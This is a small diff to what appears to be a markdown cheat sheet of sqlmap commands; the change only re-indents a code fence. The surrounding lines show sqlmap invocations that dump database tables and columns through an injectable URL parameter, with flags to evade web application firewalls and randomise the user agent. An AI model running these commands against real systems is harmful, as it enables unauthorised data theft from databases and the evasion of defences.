@@ -28,6 +28,6 @@ sqlmap - u "url?prm=" -p prm -D dbname  --dump
  
 * **Optimised Url**
 
-  ```
+```
 sqlmap -u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump --method GET --code 200 --skip-waf --random-agent --threads 10 -o
 ```
